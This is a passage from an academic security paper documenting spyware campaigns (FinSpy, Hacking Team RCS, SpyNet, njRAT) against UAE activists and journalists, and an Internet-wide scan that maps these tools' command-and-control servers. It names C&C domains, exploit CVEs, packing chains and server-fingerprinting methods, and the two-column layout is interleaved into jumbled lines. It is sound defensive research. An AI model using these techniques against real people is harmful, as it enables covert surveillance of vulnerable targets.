that triggered the exploit was displayed in the document .                 FinSpy samples used in Bahrain overwrite the hard disk ’s boot
The exploit loaded shellcode that downloaded a second stage               sector to modify the boot process ; the spyware is loaded be-
8
518    23rd USENIX Security Symposium 	                                                                                                  USENIX Association
fore the OS , and injects itself into OS processes as they start .                     faddeha.com               hamas.sytes.net      dreems.no-ip.ca
The RCS samples we examined also had the ability to propa-
Hosts sample that           Same IP             SameIP1
gate to other devices , including into inactive VMWare virtual                                      talks to C&C
machines by modifying the disk image , onto USB flash drives ,
CVE-2013 - 0422
and onto Windows Mobile phones . We did not observe similar                                                            Used by sample
that talks to C&C
capabilities in the FinSpy samples we examined .                                 Journalist A ,
H.R. activist B     njq8
Journalist F
Exploitation of captured data : When Ahmed Mansoor re-
ceived the RCS document , he opened it , infecting his computer                   njRAT                            VB Packer                    upload.bz
( Figure 5 ) . Ahmed subsequently noted several suspicious ac-                                storge.myftp.org
cesses to his GMail account using IMAP . Even after he changed
his password , the accesses continued . While corresponding
with Ahmed on his compromised account , an author of this pa-
per discovered that the attackers had installed an application-
specific password [ 56 ] in Ahmed ’s GMail account , a secondary                             Relative of                                   SpyNet
political detainee D
password that they apparently used to access his account even
after he changed his main password . The suspicious accesses                         Journalist C
stopped after removal of the application - specific password .
Two weeks after this correspondence with Ahmed , one of us
( Author in Figure 5 ) received a targeted e - mail with a link to                                     H.R. activist E
a file hosted on Google Docs containing a commercial off - the-                    SameIP1
shelf RAT , Xtreme RAT . The e - mail was sent from the UAE ’s
timezone ( as well as of other countries ) and contained the terms                  sn.all-google.com            DarkComet       Appin        CVE 2012 - 0158
“ veryimportant ” and “ wikileaks ” , just like in the e - mail re-
ceived by Ahmed .
The instance of Xtreme RAT sent to Author used                        Figure 6 : Another part of the ecosystem of UAE surveil-
owner.no-ip.biz for its C&C , one of the domains men-                     lance attacks .
tioned in a report published by Norman about a year - long cam-
paign of cyberattacks on Israeli and Palestinian targets carried
out by a group that Norman was unable to identify [ 57 ] . Three            Off - the - shelf RATs . We found a file that VirusTotal had
months after Author was targeted , Ahmed received an e - mail               downloaded from faddeha.com , which appeared to be a re-
containing an attachment with Xtreme RAT that talked to the              mote access toolkit known as SpyNet , available for general pur-
same C&C server ( Figure 5 ) , suggesting that the attackers who            chase for 50 Euros [ 60 ] . The SpyNet sample communicated
infected Ahmed with RCS may have provided a list of interest-            with the C&C hamas.sytes.net .
ing e - mail addresses to another group for further targeting .                SpyNet Packing : We found another instance of the first
stage of the 3-Stage Exploit Kit on VirusTotal . The exploit
Possible consequences : Shortly after he was targeted ,                 downloaded a second stage , which in turn downloaded a sam-
Ahmed says he was physically assaulted twice by an attacker              ple of SpyNet from maile-s.com . This sample of SpyNet
who appeared able to track Ahmed ’s location [ 58 ] . He also re-            communicated with the same C&C hamas.sytes.net .
ports that his car was stolen , a large sum of money disappeared          The sample was packed using ASProtect [ 61 ] . When run , the
from his bank account , and his passport was confiscated [ 59 ] .            sample unpacks a compiled Visual Basic project that loads , via
He believes these consequences are part of a government in-              the RunPE method [ 62 ] , an executable packed with UPX [ 63 ] .
timidation campaign against him , but we did not uncover any              Finally , this executable unpacks SpyNet . SpyNet ’s GUI only
direct links to his infection . ( Interestingly , spyware subse-            offers an option to pack with UPX , suggesting that the attack-
quently sent to others has used bait content about Ahmed . )               ers specially added the other layers of packing . In some cases ,
Further attacks : In October 2012 , UAE Journalist A and                the Visual Basic project bears the name NoWayTech , which
Human Rights activist B ( per Figure 6 ) forwarded us suspi-               appears to be an underground RunPE tool , while others are
cious e - mails they had received that contained a Word docu-              named SpyVisual , which we have been unable to trace to any
ment corresponding to the first stage of 3-Stage Exploit Kit             public underground tools , and thus also may reflect customiza-
( Figure 5 ) . The attachment contained an embedded Flash file              tion by the attacker . The SpyVisual projects contain the string
that exploited a vulnerability fixed in Adobe Flash 11.4 , loading        c:\Users\Zain\AppData\Local\Temp\OLE1EmbedStrm.wav ,
shell code to download a second stage from faddeha.com .                  which we used as the fingerprint VB Packer in Figure 6 .
We were unable to obtain the second stage or the ultimate pay-              Cedar Key attack : The same VB Packer was used in an
load , as the website was unavailable at the time of testing .             attack on Relative of political detainee D and H.R. activist
However , the exploit kit appears indicative of Hacking Team              E in Figure 6 . These individuals received e - mails containing a
involvement . A page on faddeha.com found in Google ’s                     link to a web page hosted on cedarkeyrv.com impersonat-
cache contained an embedded .jar with the same applet class              ing YouTube . Loading the page greeted the target with “ Video
( WebEnhancer ) as those observed in other .jar files that we              loading please wait . . . ” The page redirected to a YouTube
found to contain RCS .                                                    video a few seconds later , but first loaded a Java exploit [ 64]—a
9
USENIX Association 	                                                                                  23rd USENIX Security Symposium    519
known vulnerability with no patch at the time that the e - mails            servers to develop indicators ( fingerprints ) for how the servers
were sent . Oracle released a patch 12 hours after activists began         respond to certain types of requests . We then scanned the full
receiving these links .                                                    Internet IPv4 address space ( “ /0 ” ) for these , along with prob-
The cedarkeyrv.com domain is associated with an RV                     ing results found by past scans . In many cases we do not release
park in Cedar Key , Florida . The website ’s hosting company                 the full details of our fingerprints to avoid compromising what
told us that the site had apparently suffered a compromise , but           may be legitimate investigations .
did not have further details .
The exploit used in the attack appears to have been origi-
5.1     FinSpy
nally posted by a Kuwaiti user , njq8 , on an Arabic - language
exploit sharing site [ 65 ] . We contacted njq8 , who told us                 Identifying and linking servers : We developed a number
that he had obtained the exploit elsewhere and modified it                of fingerprints for identifying FinSpy servers using HTTP-
prior to posting . The attack downloaded an instance of                    based probing as well as FinSpy ’s custom TLV - based proto-
SpyNet from isteeler.com ( which from our inspection did                   col . We leveraged quirks such as specific non - compliance
not appear to have any legitimate content ) , which used the                with RFC 2616 , responses to certain types of invalid data ,
C&C storge.myftp.org . This same C&C occurred in an-                       and the presence of signatures such as the bizarre “ Hallo
other attack ( Figure 6 ) targeting Relative of political detainee          Steffi ” that Guarnieri identified from Bahraini FinSpy C&C
D ; in that case , the payload was a freely - available RAT known             servers [ 67 , 68 ] . See Appendix A for details . We then exhaus-
as njRAT , written by the same njq8 as the exploit - poster dis-             tively scanned the Internet looking for matches to these finger-
cussed above . However , we did not find any other evidence                 prints .
suggesting njq8 ’s involvement in either attack .                              Gamma documentation advertises that an operator of FinSpy
More SpyNet attacks : The domain hamas.sytes.net ,                       can obscure the location of the C&C server ( called the mas-
which we previously saw used by two SpyNet sam-                           ter ) by setting up a proxy known as a relay . In Spring 2013
ples , resolved to 67.205.79.177 .                     Historically ,         we noticed FinSpy servers now issuing 302 Redirects to
dreems.no-ip.ca also resolved to this address . An                         google.com . However , we noticed anomalies : for ex-
unidentified dropper using this C&C targeted Journalist F ; a              ample , servers in India were redirecting to the Latvian ver-
SpyNet attack on Relative of political detainee D also used               sion of Google google.lv . We suspect that the server
this C&C. In that latter case , the sample arrived via e - mail              in India was a relay forwarding to a master in Latvia . Be-
in a .rar attachment that contained an .scr file disguised                cause the master served as a proxy for Google , we could
as a Word document . The .scr file was a self - extracting                   uncover its IP address using a Google feature that prints a
archive that decompressed and ran both the bait document                  user ’s IP address for the query “ IP address . ” We created an
and the payload . The SMTP source of the e - mail was                        additional fingerprint based on the proxying behavior and is-
webmail.upload.bz .                                                        sued GET /search?q = ip+address&nord=1 requests to
Appin : In early 2013 UAE H.R. activist E forwarded nu-                 servers We note some interesting master locations in Table 4 .
merous documents that included a particular CVE-2012 - 0158                    Server locations : In all , our fingerprints matched 92 dis-
exploit for Microsoft Word . In all , these totaled 17 distinct             tinct IP addresses in 35 different countries . Probing these on
hashes of documents , and 10 distinct hashes of payloads ( some             8/8/13 revealed 22 distinct addresses still responding , sited
documents that differed in their hash downloaded the same pay-            in : Bahrain , Bangladesh , Bosnia and Herzegovina , Estonia ,
load ) . The exploits primarily downloaded instances of SpyNet              Ethiopia , Germany , Hong Kong , Indonesia , Macedonia , Mex-
from upload.bz , which for the most part communicated                      ico , Romania , Serbia , Turkmenistan , and the United States . We
with C&C at sn.all-google.com . This domain was also                       found servers responding to a number of our fingerprints , sug-
used for C&C in other attacks , including that on Journalist C.            gesting either that some servers lag in their updates , or a con-
Two of the other CVE-2012 - 0158 exploits down-                          certed effort to vary the behavior of FinSpy servers to make
loaded DarkComet from www.getmedia.us and                                 detection harder .
www.technopenta.com after posting system infor-                              We found : ( 1 ) 3 IP addresses in ranges registered to Gamma .
mation to random123.site11.com . All three domains                         ( 2 ) Servers in 3 IP ranges explicitly registered to govern-
match those used by an Indian cybermercenary group said                   ment agencies : Turkmenistan ’s Ministry of Communications ,
to be linked to Appin Security Group [ 66 ] .            The former           Qatar ’s State Security Bureau , and the Bulgarian Council of
two domains hosted content other than spyware ( i.e. , they                 Ministers . ( 3 ) 3 additional IP addresses in Bahrain , all in
may have been compromised ) . We alerted the owner of                       Batelco . ( 4 ) Servers in 7 countries with governments classified
www.getmedia.us , who removed the payloads .                                as “ authoritarian regimes ” by The Economist [ 69 ] : Bahrain ,
Ethiopia , Nigeria , Qatar , Turkmenistan , UAE , Vietnam .
Additional FinSpy samples : In parallel to our scanning ,
5     Empirical characterization                                           we obtained 9 samples of FinSpy by writing YARA [ 70 ] rules
for the “ malware hunting ” feature of VirusTotal Intelligence .
The samples we received afforded us an opportunity to em-                 This feature sends us all newly - submitted samples that match
pirically characterize the use of FinFisher and Hacking Team              our signatures . We located a version of FinSpy that does not
around the world , enabling us to assess their prevalence , and             use the normal FinSpy handshake , but instead uses a protocol
identify other country cases that may warrant future investiga-           based on HTTP POST requests for communication with the
tion . We analyzed the samples and the behavior of their C&C               C&C server . This did not appear to be an older or newer ver-
10
520    23rd USENIX Security Symposium 	                                                                                USENIX Association
Relay IP              Relay Block Assignment     Relay Country     Master IP                Master Block Assignment     Master Country
5.199.xxx.xxx         SynWebHost                 Lithuania         188.219.xxx.xx           Vodafone                    Italy
46.23.xxx.xxx         UK2 VPS.net                UK                78.100.xxx.xxx           State Security Building     Qatar
119.18.xxx.xxx        HostGator                  India             81.198.xxx.xxx           Statoil DSL                 Latvia
180.235.xxx.xxx       Asia Web Services          Hong Kong         80.95.xxx.xxx            T - Systems                   Czech Republic
182.54.xxx.xxx        GPLHost                    Australia         180.250.xxx.xxx          PT Telekom                  Indonesia
206.190.xxx.xxx       WestHost                   USA               112.78.xxx.xxx           Biznet ISP                  Indonesia
206.190.xxx.xxx       Softlayer                  USA               197.156.xxx.xxx          Ethio Telecom               Ethiopia
209.59.xxx.xxx        Endurance International    USA               59.167.xxx.xxx           Internode                   Australia
209.59.xxx.xxx        Endurance International    USA               212.166.xxx.xxx          Vodafone                    Spain
Table 4 : Deproxifying FinSpy ( mapping initial C&C IP addresses to the masters to which they forward ) .
sion of the protocol , suggesting that our scan results may not                   Country             IPs              Provider            IPs
reveal the full scope of FinSpy C&C servers . Perhaps , the                      United States          61               Linode              42
HTTP POST protocol was only delivered to a specific Gamma                     United Kingdom          18             NOC4Hosts             16
customer to meet a requirement .                                                     Italy             16            Telecom Italia          9
Japan              10            Maroc Telecom           7
Morocco               7              InfoLink              6
5.2     Remote Control System ( RCS )
We began by analyzing the UAE RCS sample from Ahmed and
Table 5 : Top countries and hosting providers for RCS
6 samples obtained from VirusTotal by searching for AV re-
servers active on 11/4/13 .
sults containing the strings “ DaVinci ” and “ RCS . ” At the time ,
several AV vendors had added detection for RCS based on a
sample analyzed by Dr. Web [ 71 ] and the UAE RCS sample                     ing one of our fingerprints in 29 different countries . We sum-
sent to Ahmed . We also similarly obtained and analyzed sam-                marize the top providers and countries in Table 5 .
ples of FSBSpy [ 72 ] , a piece of malware that can report system                The prevalence of active servers either located in the USA or
information , upload screenshots , and drop and execute more                 hosted by Linode is striking,8 and seems to indicate a pervasive
malware , Based on these samples , we devised YARA signa-                    use of out - of - country web hosting and VPS services .
tures that yielded 23 additional samples of structurally similar              In addition , we found : ( 1 ) 3 IP addresses on a /28 named
malware .                                                                   “ HT public subnet ” that is registered to the CFO of Hacking
Fingerprints : We probed the C&C servers of the RCS and                 Team [ 76 ] . The domain hackingteam.it resolves to an
FSBSpy samples , and found that they responded in a distinc-                address in this range . ( 2 ) An address belonging to Omantel , a
tive way to HTTP requests , and returned distinctive SSL cer-               majority - state - owned telecom in Oman . This address was un-
tificates .                                                                 reachable when we probed it ; a researcher pointed us to an FS-
BSpy sample that contained an Arabic - language bait document
We searched sources including Shodan , 5 Internet Census
about Omani poetry , which talked to a C&C in the UK . ( 3 ) 7
service probes [ 73 ] , and Critical . IO scanning data [ 68 ] for the
IP addresses belonging to Maroc Telecom . Moroccan journal-
observed distinctive HTTP behavior . We searched for the dis-
ists at Mamfakinch.com were previously targeted by RCS in
tinctive SSL certificates in two Internet Census service probes ,
2012 [ 77 ] . ( 4 ) Overall , servers in 8 countries with governments
and SSL certificate scans from ZMap [ 74 ] . We also contacted a
deemed “ authoritarian regimes ” [ 69 ] : Azerbaijan , Kazakhstan ,
team at TU Munich [ 75 ] , who applied our fingerprints to their
Nigeria , Oman , Saudi Arabia , Sudan , UAE , Uzbekistan .
SSL scanning data . Across all of these sources , we obtained
Link to Hacking Team : All active servers match-
31,345 indicator hits reflecting 555 IP addresses in 48 coun-
ing one of our signatures also responded peculiarly when
tries .
queried with particular ill - formed HTTP requests , respond-
One SSL certificate returned by 175 of the servers was issued
ing with “ HTTP1/1 400 Bad request ” ( should be
by “ /CN = RCS Certification Authority /O = HT srl , ” apparently
“ HTTP/1.1 ” ) and a body of “ Detected error : HTTP
referring to the name of the spyware and the company . Servers
code 400 ” . Googling for this response yielded a GitHub
for 5 of our FSBSpy samples and 2 of our RCS samples re-
project em - http - server [ 78 ] , a Ruby - based webserver .
sponded with this type of certificate .
The project ’s author is listed as Alberto Ornaghi , a software
Some servers returned these certificates in chains that in-
architect at Hacking Team . We suspect that the Hacking Team
cluded another distinctive certificate . We found 175 distinct IP
C&C server code may incorporate code from this project .
addresses ( including the C&C ’s for 5 of our FSBSpy samples
Links between servers : We identified many cases where
and 2 of our RCS samples ) responded with this second type of
several servers hosted by different providers , and in different
certificate .
countries , returned identical SSL certificates matching our fin-
We devised two more indicators : one that matched 125 IP
gerprints . We also observed 30 active servers used a global
addresses , including 7 of our FSBSpy samples’ C&C ’s , and
IPID . Only one active server had neither a global IPID nor
one that matched 2 IP addresses , in Italy and Kazakhstan .
Server locations : On 11/4/13 we probed all of the IP ad-                   8 19 of the 42 Linode servers were hosted in the USA , so the two
dresses that we collected , finding 166 active addresses match-             patterns of prevalence are mostly distinct .
11
USENIX Association 	                                                                             23rd USENIX Security Symposium    521
an SSL certificate matching our fingerprints . We assessed                   ing 11 cases in which they appeared to be used in countries
whether servers returning SSL certificates were forwarding to               governed by “ authoritarian regimes . ”
the servers with global IPIDs by inducing bursts of traffic at the              We aim with this work to inspire additional research efforts
former and monitoring the IPID at the latter . For 11 servers ,               addressing the difficult problem of how to adequately protect
we found that the server ’s activity correlated to bursts sent to            individuals with very limited resources facing very powerful
other servers We grouped servers by the SSL certificates they               adversaries . Open questions include robust , practical detection
returned , and found that each group forwarded to only a sin-                of targeted attacks designed to exfiltrate data from a victim ’s
gle server , except for one case where a group forwarded to two              computer , as well as detection of and defense against novel at-
different IPs ( both in Morocco ) . We also found two groups                   tack vectors , like tampering with Internet connections to insert
that forwarded to the same address . There was a 1:1 mapping                 malware .
between the remaining 8 addresses and groups . We refer to a                     The task is highly challenging , but the potential stakes are
group along with the server(s ) it forwards to as a server group .            likewise very high . An opposition member , reflecting on gov-
We identified several server groups that may be associated with             ernment hacking in Libya , speculated as to why some users
victims or operators in a certain country . Some of these suggest            would execute files even while recognizing them as potentially
possible further investigation :                                             malicious [ 2 ] : “ If we were vulnerable we could n’t care less . . .
Turkey : We identified a group containing 20 servers in 9                 we were desperate to get our voices out . . . it was a matter of
countries . Two RCS and 5 FSBSpy samples from VirusTo-                       life or death . . . it was just vital to get this information out . ”
tal communicated with various servers in the group . The RCS
samples also communicated with domains with lapsed registra-
Acknowledgment
tions , so we registered them to observe incoming traffic . We ex-
clusively received RCS traffic from Turkish IP addresses . ( RCS              This work was supported by the National Science Foundation
traffic is identifiable based on a distinctive user agent and URL           under grants 1223717 and 1237265 , and by a Citizen Lab Fel-
in POST requests . ) A sample of FSBSpy apparently installed                  lowship . Any opinions , findings , and conclusions or recom-
from an exploit on a Turkish server talked to one of the servers            mendations expressed in this material are those of the authors
in this group.[79 ]                                                          and do not necessarily reflect the views of the sponsors .
We also found server groups containing servers in Uzbek-                    The authors would like to thank the following individuals
istan and Kazakhstan ; we found FSBSpy samples on Virus-                     for their help in various aspects of our analysis : Bernhard Am-
Total uploaded from these countries that communicated with                  man , Collin D. Anderson , Brandon Dixon , Zakir Durumeric ,
servers in these groups .                                                    Eva Galperin , Claudio Guarnieri , Drew Hintz , Ralph Holz ,
In the above cases , save Turkey , the country we have identi-             Shane Huntley , Andrew Lyons , Mark Schloesser , and Nicholas
fied is classified as an “ authoritarian regime , ” and may be using           Weaver .
Hacking Team products against the types of targets we profile
in this paper . In the case of Turkey , there are hints that the tool
may be employed against dissidents [ 80 ] .                                    References
[ 1 ] “ Dark Secrets — Hacking Team commercial , ” ac-
cessed :        12-November-2013 . [ Online ] . Available :
6     Summary
http://bit.ly/1bCh57v
Targeted surveillance of individuals conducted by nation - states              [ 2 ] J. Scott - Railton , “ Revolutionary Risks : Cyber Technol-
poses an exceptionally challenging security problem , given the                   ogy and Threats in the 2011 Libyan Revolution , ” US
great imbalance of resources and expertise between the victims                   Naval War College , Tech . Rep. , 2013 .
and the attackers . We have sketched the nature of this problem               [ 3 ] S. H. AlJalahma , “ Response to The Guardian — UK
space as reported to us by targeted individuals in three Middle                  companys software used against Bahrain activist , ” May
Eastern countries . The attacks include spyware for ongoing                       2013 , accessed : 12-November-2013 . [ Online ] . Available :
monitoring and the use of “ IP spy ” links to deanonymize those                    http://bit.ly/19iVUUP
who voice dissent .                                                           [ 4 ] V. Silver , “ Gamma Says No Spyware Sold to
The attacks , while sometimes incorporating effective so-                     Bahrain ; May Be Stolen Copy , ” Jul. 2012 , ac-
cial engineering , in general lack novel technical elements . In-                  cessed :      12-November-2013 . [ Online ] . Available :
stead , they employ prepackaged tools developed by vendors                        http://bloom.bg/17SOXQs
or acquired from the cybercrime underground . This technol-
[ 5 ] A. Jeffries , “ Meet Hacking Team , the company that helps
ogy sometimes suffers from what strike us as amateurish mis-
the police hack you , ” Sep. 2013 , accessed : 12-November-
takes ( multiple serious errors implementing cryptography , bro-
2013 . [ Online ] . Available : http://bit.ly/1bCajyl
ken protocol messages ) , as does the attackers’ employment of
it ( identifying - information embedded in binaries , C&C servers                [ 6 ] T. Brewster , “ From Bahrain To Belarus : Attack Of The
discoverable via scanning or “ Google hacking ” , clusters of at-                   Fake Activists , ” Jul. 2013 , accessed : 12-November-2013 .
tack accounts tied by common activity ) . Some of these errors                     [ Online ] . Available : http://bit.ly/1gIgwhW
assisted our efforts to assemble strong circumstantial evidence              [ 7 ] V. Silver , “ MJM as Personified Evil Says Spyware Saves
of governmental origins . In addition , we mapped out the global                   Lives Not Kills Them , ” 2011 , accessed : 12-November-
use of two “ governmental ” hacking suites , including identify-                    2013 . [ Online ] . Available : http://bloom.bg/170E8sQ
12
522    23rd USENIX Security Symposium 	                                                                                    USENIX Association
[ 8 ] D. Gilbert , “ Hacking Team and the Murky World of                  [ 27 ] “ FinFisher - Excellence in IT Investigation , ” ac-
State - Sponsored Spying , ” 2013 , accessed : 12-November-                  cessed :       27-February-2014 . [ Online ] . Available :
2013 . [ Online ] . Available : http://bit.ly/17tBBtm                       http://www.finfisher.com/
[ 9 ] R. Clayton , S. J. Murdoch , and R. N. Watson , “ Ignoring            [ 28 ] R. Rolles , “ Unpacking virtualization obfuscators , ” in
the Great Firewall of China , ” in PETS . Springer , 2006 ,                 USENIX WOOT , 2009 .
pp . 20–35 .                                                        [ 29 ] “ TEMU : The BitBlaze Dynamic Analysis Compo-
[ 10 ] J. R. Crandall et al . , “ ConceptDoppler : A Weather                      nent , ” accessed : 7-August-2013 . [ Online ] . Available :
Tracker for Internet Censorship , ” in ACM CCS , 2007 .                    http://bit.ly/1clcxSZ
[ 11 ] X. Xu , Z. M. Mao , and J. A. Halderman , “ Internet Cen-             [ 30 ] “ ‘ Reinstate sacked official’        call , ”    2013 ,    ac-
sorship in China : Where Does the Filtering Occur ? ” in                  cessed :        11-November-2013 .     [ Online ] . Available :
Proc . PAM , 2011 .                                                       http://bit.ly/1aRUZ4b
[ 12 ] M. Sherr , G. Shah , E. Cronin , S. Clark , and M. Blaze ,             [ 31 ] “ Unionist Questioned , ” 2013 , accessed : 23-April-2013 .
“ Can They Hear Me Now ? A Security Analysis of Law                      [ Online ] . Available : http://bit.ly/1gHnBiS
Enforcement Wiretaps , ” in ACM CCS , 2009 , pp . 512–                 [ 32 ] N. Villeneuve , “ Fake Skype Encryption Service Cloaks
523 .                                                                   DarkComet Trojan , ” Apr. 2012 , accessed : 4-August-
[ 13 ] J. R. Crandall , M. Crete - Nishihata , and J. Knockel , “ Chat              2013 . [ Online ] . Available : http://bit.ly/17SpA1c
program censorship and surveillance in China : Tracking            [ 33 ] E. Galperin and M. Marquis - Boire , “ Fake YouTube
TOM - Skype and Sina UC , ” First Monday , vol . 18 , no . 7 ,                  Site Targets Syrian Activists With Malware , ” Mar.
Jul. 2013 , accessed : 8-August-2013 . [ Online ] . Available :               2012 , accessed : 4-August-2013 . [ Online ] . Available :
http://bit.ly/1fzNcHl                                                  http://bit.ly/HSCRet
[ 14 ] S. Wolchok , R. Yao , and J. A. Halderman , “ Analysis of             [ 34 ] —— , “ New Wave of Facebook Phishing Attacks Targets
the Green Dam Censorware System , ” Tech . Rep. , 2009 .                    Syrian Activists , ” Apr. 2012 , accessed : 4-August-2013 .
[ 15 ] F. Li , A. Lai , and D. Ddl , “ Evidence of Advanced Persis-               [ Online ] . Available : http://bit.ly/1hDQsG8
tent Threat : A case study of malware for political espi-          [ 35 ] —— , “ Pro - Syrian Government Hackers Target Activists
onage , ” in MALWARE , 2011 .                                              With Fake Anti - Hacking Tool , ” Aug. 2012 , accessed :
[ 16 ] “ Default https access for Gmail , ” 2010 , accessed : 7-                   4-August-2013 . [ Online ] . Available : http://bit.ly/1eJj12T
August-2013 . [ Online ] . Available : http://bit.ly/1bBktPM           [ 36 ] J. Scott - Railton and M. Marquis - Boire , “ A Call to Harm :
[ 17 ] “ Making Twitter more secure : HTTPS , ” 2011 , accessed :                   New Malware Attacks Target the Syrian Opposition , ”
7-August-2013 . [ Online ] . Available : http://bit.ly/1i7l9kM              Citizen Lab , Tech . Rep. , Jun. 2013 , accessed : 3-August-
2013 . [ Online ] . Available : http://bit.ly/1a2l9PK
[ 18 ] L. Constantin , “ Facebook to roll out HTTPS by default
to all users , ” 2012 , accessed : 7-August-2013 . [ Online ] .           [ 37 ] E. Galperin and M. Marquis - Boire , “ Trojan Hidden
Available : http://bit.ly/1bsLBCm                                       in Fake Revolutionary Documents Targets Syrian Ac-
tivists , ” May 2012 , accessed : 4-August-2013 . [ Online ] .
[ 19 ] “ FinFisher : Governmental IT Intrusion and Remote
Available : http://bit.ly/1cSJT0
Monitoring Solutions , ” accessed : 12-November-2013 .
[ Online ] . Available : http://bit.ly/1840Lxn                        [ 38 ] M. Marquis - Boire and S. Hardy , “ Syrian Activists Tar-
geted with BlackShades Spy Software , ” Jun. 2012 ,
[ 20 ] “ BlackBerry rogue software leaves sour taste in UAE , ”
accessed :       12-November-2013 . [ Online ] . Available :
2013 , accessed : 11-November-2013 . [ Online ] . Available :
http://bit.ly/1a2l6mX
http://on.ft.com/HVXvJP
[ 39 ] S. Fagerland , “ The Syrian Spyware , ” Feb. 2012 ,
[ 21 ] Mandiant , “ The Advanced Persistent Threat , ” 2010 .
accessed :        4-August-2013 . [ Online ] . Available :
[ 22 ] —— , “ APT1 : Exposing One of China ’s Cyber Espionage                     http://bit.ly/HLyGR9
Units , ” 2013 .
[ 40 ] Telecomix , “ REPORT of a Syrian spyware , ” p. 9 , Feb.
[ 23 ] S. Fagerland , M. Krakvik , J. Camp , and N. Moran , “ Op-                  2012 , accessed : 4-August-2013 . [ Online ] . Available :
eration Hangover : Unveiling an Indian Cyberattack In-                  http://bit.ly/1bsNcIk
frastructure , ” 2013 .
[ 41 ] S. Faris , “ The Hackers of Damascus , ” Nov.
[ 24 ] R. Deibert and R. Rohozinski , “ Tracking GhostNet : In-                  2012 , accessed : 9-August-2013 . [ Online ] . Available :
vestigating a Cyber Espionage Network , ” Information                    http://buswk.co/17t8RRH
Warfare Monitor , p. 6 , 2009 .                                      [ 42 ] L. Aylward , “ Malware Analysis — Dark Comet RAT , ”
[ 25 ] S. Nagaraja and R. Anderson , “ The snooping dragon :                     Nov. 2011 , accessed : 4-August-2013 . [ Online ] . Avail-
social - malware surveillance of the Tibetan movement , ”                  able : http://bit.ly/16ZXgag
Tech . Rep. , 2009 .                                                 [ 43 ] Quequero , “ DarkComet Analysis — Understanding the
[ 26 ] F. C. Solutions , “ “ njRAT ” Uncovered , ” 2013 , accessed :                  Trojan used in Syrian Uprising , ” Mar. 2012 , accessed :
25-June-2013 . [ Online ] . Available : http://bit.ly/1eJheel               4-August-2013 . [ Online ] . Available : http://bit.ly/19i6kEl
13
USENIX Association 	                                                                       23rd USENIX Security Symposium    523
[ 44 ] S. Denbow and J. Hertz , “ Pest Control : Taming the                [ 63 ] “ Ultimate        Packer         for     eXecutables , ”      ac-
RATs , ” p. 14 , accessed : 12-November-2013 . [ Online ] .                   cessed :         27-February-2014 . [ Online ] . Available :
Available : http://bit.ly/1fzLA0m                                      http://upx.sourceforge.net/
[ 45 ] B. Brumfield , “ Computer spyware is newest weapon in              [ 64 ] “ CVE-2013 - 0422 , ” accessed : 27-February-2014 . [ On-
Syrian conflict , ” Feb. 2012 , accessed : 4-August-2013 .                 line ] . Available : http://bit.ly/NA1O0A
[ Online ] . Available : http://cnn.it/HLz5TA                        [ 65 ] njq8 , “ New java drive - by 2013 - 1 - 11 , ” 2013 , accessed :
[ 46 ] “ jalnosra.com , ” accessed : 27-February-2014 . [ Online ] .                 27-February-2014 . [ Online ] . Available : http://www.dev-
Available : jalnosra.com                                               point.com/vb/t357796.html
[ 47 ] “ Skype Encryption.wmv , ” accessed : 27-February-2014 .              [ 66 ] “ Appin Technology Lab , ” accessed : 27-February-2014 .
[ Online ] . Available : http://bit.ly/HZ3e1y                             [ Online ] . Available : http://www.appinonline.com/
[ 48 ] E. Galperin and M. Marquis - Boire , “ The Internet                  [ 67 ] C. Guarnieri , “ Analysis of the FinFisher Lawful
is Back in Syria and So is Malware Targeting                          Interception Malware , ” 2012 , accessed : 7-August-2013 .
Syrian Activists , ” Dec. 2012 , accessed : 4-August-2013 .                [ Online ] . Available : http://bit.ly/1eJjVMV
[ Online ] . Available : http://bit.ly/1bngqFc                       [ 68 ] H. Moore , “ Critical Research : Internet Security Survey , ”
[ 49 ] “ Free Syrian Army Sex Tape — Abdul Razzaq Tlass                         2012 .
[ NSFW ] , ” accessed : 5-August-2013 . [ Online ] . Available :           [ 69 ] “ Democracy Index 2012 : Democracy at a Standstill , ”
http://bit.ly/1gHqDDH                                                 2012 , accessed : 7-August-2013 . [ Online ] . Available :
[ 50 ] A. Lund , “ Holy Warriors : A field guide to Syria ’s jihadi              http://bit.ly/HSEDMD
groups , ” Oct. 2012 , accessed : 5-August-2013 . [ Online ] .           [ 70 ] “ YARA - The pattern matching swiss knife for malware
Available : http://atfp.co/17t8yq5                                     researchers , ” accessed : 27-February-2014 . [ Online ] .
Available : http://plusvic.github.io/yara/
[ 51 ] “ Ahmed Mansoor and Four Other Pro - Democracy
Activists Pardoned and Freed , ”            2013 ,    ac-             [ 71 ] “ Cross - platform Trojan controls Windows and Mac
cessed :        10-November-2013 . [ Online ] . Available :                  machines , ” 2012 , accessed : 7-August-2013 . [ Online ] .
http://bit.ly/18pHpis                                                 Available : http://bit.ly/1eJnJgZ
[ 52 ] “ Royal Group , ” accessed : 27-February-2014 . [ Online ] .             [ 72 ] S. Golovanov , “ Adobe Flash Player 0-day and Hack-
Available : http://www.royalgroupuae.com/                              ingTeam ’s Remote Control System , ” 2013 , accessed :
7-August-2013 . [ Online ] . Available : http://bit.ly/17n12ro
[ 53 ] T. Katsuki , “ Crisis for Windows Sneaks onto Virtual
Machines , ” 2012 , accessed : 27-February-2014 . [ Online ] .           [ 73 ] “ Internet Census 2012 , ” 2013 , accessed : 7-August-2013 .
Available : http://bit.ly/MzheRJ                                       [ Online ] . Available : http://bit.ly/1i7rRHs
[ 74 ] Z. Durumeric , E. Wustrow , and J. A. Halderman , “ ZMap :
[ 54 ] “ Hacking Team , ” accessed : 27-February-2014 . [ Online ] .
Fast Internet - Wide Scanning and its Security Applica-
Available : http://www.hackingteam.it/
tions , ” in USENIX Security , Aug. 2013 .
[ 55 ] “ MPRESS , ” accessed : 27-February-2014 . [ Online ] .
[ 75 ] “ Home of Crossbear and OONIBear , ”                       ac-
Available : http://www.matcode.com/mpress.htm
cessed :         27-February-2014 . [ Online ] . Available :
[ 56 ] “ Sign in using application - specific passwords , ”                       https://pki.net.in.tum.de/
accessed :      27-February-2014 . [ Online ] . Available :
[ 76 ] “ RIPE Database Query for FASTWEB - HT , ” ac-
https://support.google.com/accounts/answer/185833?hl=en
cessed :         27-February-2014 . [ Online ] . Available :
[ 57 ] S. Fagerland , “ Systematic cyber attacks against Is-                   http://bit.ly/MzkigV
raeli and Palestinian targets going on for a year , ”              [ 77 ] “ How Government - Grade Spy Tech Used A Fake Scandal
2012 , accessed : 12-November-2013 . [ Online ] . Available :                To Dupe Journalists , ” 2012 , accessed : 7-August-2013 .
http://bit.ly/1aSdw07
[ 78 ] A. Ornaghi , “ em - http - server , ” accessed : 27-February-
